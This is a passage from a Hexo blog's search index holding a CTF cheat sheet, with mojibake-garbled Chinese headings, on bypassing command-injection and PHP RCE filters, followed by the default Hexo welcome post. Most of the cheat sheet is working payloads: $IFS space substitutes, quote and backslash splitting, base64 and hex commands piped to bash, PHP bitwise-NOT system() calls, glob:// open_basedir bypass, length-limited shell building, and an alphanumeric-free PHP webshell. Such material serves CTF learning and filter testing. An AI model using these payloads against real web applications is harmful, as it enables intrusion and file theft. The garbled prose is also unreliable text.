title="(1)ç®¡é“ç¬¦ç»•è¿‡ï¼š"></a>(1)ç®¡é“ç¬¦ç»•è¿‡ï¼š</h5><p>ï¼›ï¼šå³ï¼›å‰åéƒ½æ‰§è¡Œ</p><p>&amp;ï¼šå³&amp;å‰åéƒ½æ‰§è¡Œ</p><p>&amp;&amp;ï¼šå³å¦‚æœ&amp;&amp;å‰ä¸ºçœŸæ‰æ‰§è¡Œ&amp;&amp;åé¢çš„ï¼Œä¸ç„¶åªæ‰§è¡Œ&amp;&amp;å‰é¢çš„</p><p>| ï¼šå³æ˜¾ç¤º|åé¢çš„æ‰§è¡Œç»“æœ</p><p>||ï¼š||å‰é¢ä¸ºå‡æ—¶æ‰æ‰§è¡Œ||åé¢çš„ï¼Œå¦åˆ™åªæ‰§è¡Œ||å‰é¢çš„</p><h5 id="2-ç©ºæ ¼è¿‡æ»¤ï¼š"><a href="#2-ç©ºæ ¼è¿‡æ»¤ï¼š" class="headerlink" title="(2)ç©ºæ ¼è¿‡æ»¤ï¼š"></a>(2)ç©ºæ ¼è¿‡æ»¤ï¼š</h5><p>ç©ºæ ¼å¯ä»¥æ›¿æ¢æˆï¼š</p><p>&lt;  &lt;&gt;  %20(å³space) %09(å³TAB)  $IFS$9  ${IFS}  $IFS  {}</p><h5 id="3-åæ–œæ ï¼š"><a href="#3-åæ–œæ ï¼š" class="headerlink" title="(3)åæ–œæ ï¼š"></a>(3)åæ–œæ ï¼š</h5><p>å¦‚catã€lsè¢«è¿‡æ»¤ï¼Œä½¿ç”¨\ç»•è¿‡ï¼š<br>c\at &#x2F;flag<br>l\s &#x2F;</p><h5 id="4-å–åç»•è¿‡ï¼š"><a href="#4-å–åç»•è¿‡ï¼š" class="headerlink" title="(4)å–åç»•è¿‡ï¼š"></a>(4)å–åç»•è¿‡ï¼š</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//å–åä¼ å‚</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a = &quot;system&quot;;</span><br><span class="line">$b = &quot;cat /flag&quot;;</span><br><span class="line"></span><br><span class="line">$c = urlencode(~$a);</span><br><span class="line">$d = urlencode(~$b);</span><br><span class="line"></span><br><span class="line">//è¾“å‡ºå¾—åˆ°å–åä¼ å‚å†…å®¹</span><br><span class="line">echo &quot;?cmd=(~&quot;.$c.&quot;)(~&quot;.$d.&quot;);&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h5 id="5-å¼‚æˆ–ç»•è¿‡"><a href="#5-å¼‚æˆ–ç»•è¿‡" class="headerlink" title="(5)å¼‚æˆ–ç»•è¿‡:"></a>(5)å¼‚æˆ–ç»•è¿‡:</h5><p>è¿™é‡Œæ¨èyuå¸ˆå‚…çš„è„šæœ¬</p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></p><h5 id="6-é»‘åå•ç»•è¿‡ï¼š"><a href="#6-é»‘åå•ç»•è¿‡ï¼š" class="headerlink" title="(6)é»‘åå•ç»•è¿‡ï¼š"></a>(6)é»‘åå•ç»•è¿‡ï¼š</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//å˜é‡æ‹¼æ¥ï¼Œå¦‚flagè¢«è¿‡æ»¤</span><br><span class="line">å°†ï¼š</span><br><span class="line">cat /flag</span><br><span class="line">æ›¿æ¢ä¸ºï¼š</span><br><span class="line">b=ag;cat /fl$b</span><br><span class="line"></span><br><span class="line">//è¯»å–æ ¹ç›®å½•</span><br><span class="line">eval(var_dump(scandir(&#x27;/&#x27;));  /.æ˜¯æœ¬çº§ç›®å½•</span><br><span class="line">//è¯»flag</span><br><span class="line">eval(var_dump(file_get_contents($_GET[&#x27;a&#x27;])););&amp;a=/flag</span><br><span class="line"></span><br><span class="line">//ç­‰æ•ˆäºæ‰“å¼€lsç›®å½•ä¸‹çš„æ–‡ä»¶</span><br><span class="line">cat `ls`</span><br><span class="line"></span><br><span class="line">//_è¢«è¿‡æ»¤ï¼Œphp8ä»¥ä¸‹ï¼Œå˜é‡åä¸­çš„ç¬¬ä¸€ä¸ªéæ³•å­—ç¬¦[ä¼šè¢«æ›¿æ¢ä¸ºä¸‹åˆ’çº¿_</span><br><span class="line">N[S.Sç­‰æ•ˆäºN_S.S</span><br><span class="line">phpéœ€è¦æ¥æ”¶e_v.a.lå‚æ•°,ç»™e[v.a.lä¼ å‚å³å¯</span><br><span class="line"></span><br><span class="line">//phpæ ‡ç­¾ç»•è¿‡</span><br><span class="line">?&gt;&lt;?= phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><h5 id="7-baseå’Œhexoç¼–ç ç»•è¿‡ï¼š"><a href="#7-baseå’Œhexoç¼–ç ç»•è¿‡ï¼š" class="headerlink" title="(7)baseå’Œhexoç¼–ç ç»•è¿‡ï¼š"></a>(7)baseå’Œhexoç¼–ç ç»•è¿‡ï¼š</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//base64ç¼–ç ç»•è¿‡,ç¼–ç cat /flagï¼Œåå¼•å·ã€| bashã€$()ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span><br><span class="line">`echo Y2F0IC9mbGFn | base64 -d`</span><br><span class="line">echo Y2F0IC9mbGFn | base64 -d | bash</span><br><span class="line">$(echo Y2F0IC9mbGFn | base64 -d)</span><br><span class="line"></span><br><span class="line">//hexç¼–ç ç»•è¿‡ï¼Œç¼–ç cat /flag,| bashç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span><br><span class="line">echo &#x27;636174202f666c6167&#x27; | xxd -r -p | bash</span><br><span class="line"></span><br><span class="line">//shellcodeç¼–ç </span><br><span class="line">//åå…­è¿›åˆ¶ç¼–ç </span><br></pre></td></tr></table></figure><h5 id="8-æ­£åˆ™åŒ¹é…ç»•è¿‡ï¼š"><a href="#8-æ­£åˆ™åŒ¹é…ç»•è¿‡ï¼š" class="headerlink" title="(8)æ­£åˆ™åŒ¹é…ç»•è¿‡ï¼š"></a>(8)æ­£åˆ™åŒ¹é…ç»•è¿‡ï¼š</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//å¦‚flagè¢«è¿‡æ»¤</span><br><span class="line">cat /f???</span><br><span class="line">cat /fl*</span><br><span class="line">cat /f[a-z]&#123;3&#125;</span><br><span class="line"></span><br><span class="line">cat /?l*</span><br></pre></td></tr></table></figure><h5 id="9-å¼•å·ç»•è¿‡ï¼š"><a href="#9-å¼•å·ç»•è¿‡ï¼š" class="headerlink" title="(9)å¼•å·ç»•è¿‡ï¼š"></a>(9)å¼•å·ç»•è¿‡ï¼š</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//å¦‚catã€lsè¢«è¿‡æ»¤*</span><br><span class="line"></span><br><span class="line">ca&quot;&quot;t /flag</span><br><span class="line"></span><br><span class="line">l&#x27;s&#x27; /</span><br></pre></td></tr></table></figure><h5 id="10-catæ›¿æ¢å‘½ä»¤ï¼š"><a href="#10-catæ›¿æ¢å‘½ä»¤ï¼š" class="headerlink" title="(10)catæ›¿æ¢å‘½ä»¤ï¼š"></a>(10)catæ›¿æ¢å‘½ä»¤ï¼š</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tacä¸catç›¸åï¼ŒæŒ‰è¡Œåå‘è¾“å‡º</span><br><span class="line">moreæŒ‰é¡µæ˜¾ç¤ºï¼Œç”¨äºæ–‡ä»¶å†…å®¹è¾ƒå¤šä¸”ä¸èƒ½æ»šåŠ¨å±å¹•æ—¶æŸ¥çœ‹æ–‡ä»¶</span><br><span class="line">lessä¸moreç±»ä¼¼</span><br><span class="line">tailæŸ¥çœ‹æ–‡ä»¶æœ«å‡ è¡Œ</span><br><span class="line">headæŸ¥çœ‹æ–‡ä»¶é¦–å‡ è¡Œ</span><br><span class="line">nlåœ¨catæŸ¥çœ‹æ–‡ä»¶çš„åŸºç¡€ä¸Šæ˜¾ç¤ºè¡Œå·</span><br><span class="line">odä»¥äºŒè¿›åˆ¶æ–¹å¼è¯»æ–‡ä»¶ï¼Œod -A d -c /flagè½¬äººå¯è¯»å­—ç¬¦</span><br><span class="line">xxdä»¥äºŒè¿›åˆ¶æ–¹å¼è¯»æ–‡ä»¶ï¼ŒåŒæ—¶æœ‰å¯è¯»å­—ç¬¦æ˜¾ç¤º</span><br><span class="line">sortæ’åºæ–‡ä»¶</span><br><span class="line">uniqæŠ¥å‘Šæˆ–åˆ é™¤æ–‡ä»¶çš„é‡å¤è¡Œ</span><br><span class="line">file -fæŠ¥é”™æ–‡ä»¶å†…å®¹</span><br><span class="line">grepè¿‡æ»¤æŸ¥æ‰¾å­—ç¬¦ä¸²ï¼Œgrep flag /flag</span><br><span class="line"></span><br><span class="line">strings(ä¹Ÿæ˜¯)</span><br></pre></td></tr></table></figure><h5 id="11-æ— å›æ˜¾ç»•è¿‡ï¼š"><a href="#11-æ— å›æ˜¾ç»•è¿‡ï¼š" class="headerlink" title="(11)æ— å›æ˜¾ç»•è¿‡ï¼š"></a>(11)æ— å›æ˜¾ç»•è¿‡ï¼š</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//æ— å›æ˜¾RCEï¼Œå¦‚exce()å‡½æ•°ï¼Œå¯å°†æ‰§è¡Œç»“æœè¾“å‡ºåˆ°æ–‡ä»¶å†è®¿é—®æ–‡ä»¶æ‰§è¡Œä»¥ä¸‹å‘½ä»¤åè®¿é—®1.txtå³å¯</span><br><span class="line">ls / | tee 1.txt</span><br><span class="line">cat /flag | tee 2.txt</span><br><span class="line">//eval()æ— è¾“å‡º</span><br><span class="line">eval(print`c\at /flag`;)</span><br></pre></td></tr></table></figure><h5 id="12-æ— å‚æ•°RCE"><a href="#12-æ— å‚æ•°RCE" class="headerlink" title="(12)æ— å‚æ•°RCE"></a>(12)æ— å‚æ•°RCE</h5><p>â€‹    åˆ©ç”¨getallheaders()ã€get_defined_vars()ã€session_idç­‰ï¼›</p><p>ä¾‹(get_defined_vars())ï¼šget_defined_vars()æ˜¯è·å¾—å››ä¸ªå…¨å±€å˜é‡<code>$_GET $_POST $_FILES $_COOKIE</code>ï¼Œè€Œå®ƒçš„è¿”å›å€¼æ˜¯ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œæˆ‘ä»¬åˆ©ç”¨<code>GET</code>æ–¹å¼ä¼ å…¥çš„å‚æ•°åœ¨ç¬¬ä¸€ä¸ªæ•°ç»„ä¸­ã€‚è¿™é‡Œæˆ‘ä»¬å°±éœ€è¦å…ˆå°†äºŒç»´æ•°ç»„è½¬æ¢ä¸ºä¸€ç»´æ•°ç»„ï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨åˆ°<code>current()</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒï¼Œè€Œå®ƒçš„é»˜è®¤æ˜¯ç¬¬ä¸€ä¸ªå•å…ƒï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬GETæ–¹å¼ä¼ å…¥çš„å‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹çœ‹å®é™…æ•ˆæœï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=eval(end(current((get_defined_vars()));wllm=phpinfo();</span><br></pre></td></tr></table></figure><h5 id="13-æ— å­—æ¯æ•°å­—RCE"><a href="#13-æ— å­—æ¯æ•°å­—RCE" class="headerlink" title="(13)æ— å­—æ¯æ•°å­—RCE"></a>(13)æ— å­—æ¯æ•°å­—RCE</h5><p>â€‹    å¼‚æˆ–ã€å–åã€è‡ªå¢ã€ä¸´æ—¶æ–‡ä»¶ä¸Šä¼ ï¼›</p><h5 id="14-å–åç»•è¿‡ï¼š"><a href="#14-å–åç»•è¿‡ï¼š" class="headerlink" title="(14)å–åç»•è¿‡ï¼š"></a>(14)å–åç»•è¿‡ï¼š</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//å–åä¼ å‚</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a = &quot;system&quot;;</span><br><span class="line">$b = &quot;cat /flag&quot;;</span><br><span class="line"></span><br><span class="line">$c = urlencode(~$a);</span><br><span class="line">$d = urlencode(~$b);</span><br><span class="line"></span><br><span class="line">//è¾“å‡ºå¾—åˆ°å–åä¼ å‚å†…å®¹</span><br><span class="line">echo &quot;?cmd=(~&quot;.$c.&quot;)(~&quot;.$d.&quot;);&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h5 id="15-é•¿åº¦é™åˆ¶ï¼š"><a href="#15-é•¿åº¦é™åˆ¶ï¼š" class="headerlink" title="(15)é•¿åº¦é™åˆ¶ï¼š"></a>(15)é•¿åº¦é™åˆ¶ï¼š</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch &quot;ag&quot;</span><br><span class="line"></span><br><span class="line">touch &quot;fl\\&quot;</span><br><span class="line"></span><br><span class="line">touch &quot;t \\&quot;</span><br><span class="line"></span><br><span class="line">touch &quot;ca\\&quot;</span><br><span class="line"></span><br><span class="line">ls -t</span><br><span class="line"></span><br><span class="line">-&gt;ca\ ,  t \  ,  fl\  ,  ag  ,  shell ,  flag</span><br><span class="line"></span><br><span class="line">ls -t &gt; shell</span><br><span class="line"></span><br><span class="line">sh shell(è¯»å–flag)</span><br><span class="line"></span><br><span class="line">ç©ºæ ¼\ ï¼š è¿™ä¸ªå…¶å®æ˜¯æ¢è¡Œã€‚</span><br><span class="line">ls -t ï¼šæŒ‰ç…§æ—¶é—´å°†æ–‡æœ¬æ’åºè¾“å‡º</span><br><span class="line">ls -t &gt; shellï¼šå°†ls -tçš„è¾“å‡ºå‚¨å­˜åˆ°shellæ–‡ä»¶ä¸­</span><br><span class="line">æˆ‘ä»¬é¦–å…ˆæ˜¯ç”¨touchå‘½ä»¤åˆ›å»ºäº†å‡ ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯ä»–ä»¬çš„æ–‡ä»¶åæ˜¯æˆ‘ä»¬çš„ä¸»è¦ã€‚æˆ‘ä»¬ä½¿ç”¨ä¸¤ä¸ª\\çš„åŸå› åœ¨äºï¼Œç¬¬ä¸€ä¸ª\ç”¨äºå°†åé¢çš„\å˜æˆå­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ª\æ˜¯ç”¨æ¥å°†åé¢çš„æ–‡æœ¬è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œä»¥ä¾¿ç”¨äºåé¢çš„æµ‹è¯•ã€‚</span><br></pre></td></tr></table></figure><h4 id="è¡¥å……ï¼š"><a href="#è¡¥å……ï¼š" class="headerlink" title="è¡¥å……ï¼š"></a>è¡¥å……ï¼š</h4><p>å…³äºæœ‰ä¸€äº›å…¨æ˜¯æŠ¥é”™çš„ï¼›å°±æ¯”å¦‚ä½¿ç”¨var_export(scandir(â€œ&#x2F;â€œ));æ‰«ææ ¹ç›®å½•æ–‡ä»¶ç»“æœå‘ç°å…¨æ˜¯ï¼Ÿï¼ä»€ä¹ˆçš„ï¼›å°±æ˜¯å…¨ç»™ä½ æ›¿æ¢äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç»“åˆ exit() å‡½æ•°æ‰§è¡Œphpä»£ç è®©åé¢çš„åŒ¹é…ç¼“å†²åŒºä¸æ‰§è¡Œç›´æ¥é€€å‡º</p><p>æå‰ç»ˆæ­¢ç¨‹åºï¼Œå³æ‰§è¡Œå®Œä»£ç ç›´æ¥é€€å‡ºï¼Œå¯ä»¥è°ƒç”¨çš„å‡½æ•°æœ‰ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä½¿ç”¨ glob:// ä¼ªåè®®ç»•è¿‡ open_basedirï¼Œè¯»å–æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œpayloadï¼š</span><br><span class="line"></span><br><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);</span><br><span class="line">foreach($a as $f)</span><br><span class="line">&#123;</span><br><span class="line">   echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br><span class="line">?&gt;</span><br><span class="line">æˆ–è€…c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;exit(0);</span><br><span class="line"></span><br><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;getFilename().&quot; &quot;);&#125; exit(0);</span><br></pre></td></tr></table></figure><h5 id="å…³äºæé™RCE"><a href="#å…³äºæé™RCE" class="headerlink" title="å…³äºæé™RCE:"></a>å…³äºæé™RCE:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_=[].&#x27;&#x27;;  //å¾—åˆ°Array</span><br><span class="line">$_=$_[&#x27;/&#x27;==&#x27;+&#x27;];   //è®©[]é‡Œçš„å€¼æŠ¥é”™è¿”å›0,å–Array[0]=Aï¼Œæ­¤æ—¶$_=A</span><br><span class="line">$____=&#x27;_&#x27;;   //è®©$____=_ï¼Œåé¢å®¹æ˜“æ‹¼æ¥</span><br><span class="line">$__=$_;   //å°†Aèµ‹ç»™$__</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;  //Aè‡ªå¢åˆ°Gï¼Œæ­¤æ—¶$__=G</span><br><span class="line">$____.=$__; //å°†_å’ŒGæ‹¼æ¥èµ·æ¥ï¼Œæ­¤æ—¶$____=_G</span><br><span class="line">$__=$_;   //å†å°†$__è¿˜åŸæˆA</span><br><span class="line">$__++;$__++;$__++;$__++;  //Aè‡ªå¢åˆ°E,æ­¤æ—¶__=E</span><br><span class="line">$____.=$__;  //Eå’Œ_Gæ‹¼æ¥ï¼Œæ­¤æ—¶$____ä¸º_GE</span><br><span class="line">$__=$_;  //å†å°†__æ¢æºæˆA</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;  //Aè‡ªå¢æˆTæ­¤æ—¶__=T</span><br><span class="line">$____.=$__;  //å†æ‹¼æ¥æˆ_GETï¼Œæ­¤æ—¶$____=_GET</span><br><span class="line">$_=$____;   //ä¸ºäº†æ–¹ä¾¿èµ·è§ï¼Œæˆ‘ä»¬æŠŠ____æ¢æˆ_</span><br><span class="line">($$_[_])($$_[__]);  //æ‹¼æˆæˆ‘ä»¬æƒ³è¦çš„($_GET[_])($_GET[__]),ä¼ å…¥_å’Œ__å‘½ä»¤æ‰§è¡Œå³å¯ </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/02/18/hello-world/"/>
      <url>/2025/02/18/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
